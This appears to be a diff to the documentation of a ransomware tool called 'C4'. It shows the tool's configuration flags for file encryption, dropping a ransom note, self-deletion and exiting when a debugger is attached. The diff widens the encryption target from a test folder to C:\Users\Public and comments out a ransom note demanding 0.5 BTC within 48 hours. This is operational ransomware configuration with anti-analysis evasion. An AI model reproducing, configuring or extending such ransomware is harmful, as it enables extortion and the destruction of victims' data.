@@ -47,16 +47,21 @@ Before building, you can tune C4's behavior by editing the globals at the top of
  ///////////////////
 
 TEXT_SECTION BOOL g_EncryptMode         =       TRUE;     // TRUE = Encrypt, FALSE = Decrypt
+
 TEXT_SECTION BOOL g_RansomMode          =       TRUE;     // TRUE = Drop a text file (g_Note) with payment instructions to the current directory
-TEXT_SECTION BOOL g_AntiDebug           =       TRUE;     // TRUE = Program exits when debugger (such as x64dbg, OllyDbg, WinDbg) is attached 
+
 TEXT_SECTION BOOL g_SelfDelete          =       TRUE;     // TRUE = Binary will self-delete
+
+TEXT_SECTION BOOL g_DebuggerEvasion     =       TRUE;     // TRUE = Program exits when debugger (such as x64dbg, OllyDbg, WinDbg) is attached 
+
 TEXT_SECTION BOOL g_Verbose             =       TRUE;     // TRUE = Print files, directories, errors, and execution time to the console
 
 
 LPCWSTR g_Directories[] = { 
-    L"C:\\Users\\Public\\TestDirectory", 
-    NULL                               
+    L"C:\\Users\\Public", 
+    NULL
 }; 
+
 
 LPCWSTR g_BlacklistedExtensions[NUM_BLACKLISTED_EXTENSIONS] = {    
     ENCRYPT_EXT_W,
@@ -65,12 +70,12 @@ LPCWSTR g_BlacklistedExtensions[NUM_BLACKLISTED_EXTENSIONS] = {
 };
 
 
-LPCSTR g_Note = {           
-    "YOUR FILES HAVE BEEN ENCRYPTED BY C4.EXE\r\n"
-    "This is not a joke. Want your data restored?\r\n"
-    "Send 0.5 BTC to the address below:\r\n"
-    "1MockBTCAddrxxxxxxxxxxxxxxxxxx\r\n"
-    "You have 48 hours.\r\n"
+LPCSTR g_Note = { ""
+//    "YOUR FILES HAVE BEEN ENCRYPTED BY C4.EXE\r\n"
+//    "This is not a joke. Want your data restored?\r\n"
+//    "Send 0.5 BTC to the address below:\r\n"
+//   "1MockBTCAddrxxxxxxxxxxxxxxxxxx\r\n"
+//    "You have 48 hours.\r\n"
 };
 ```
 
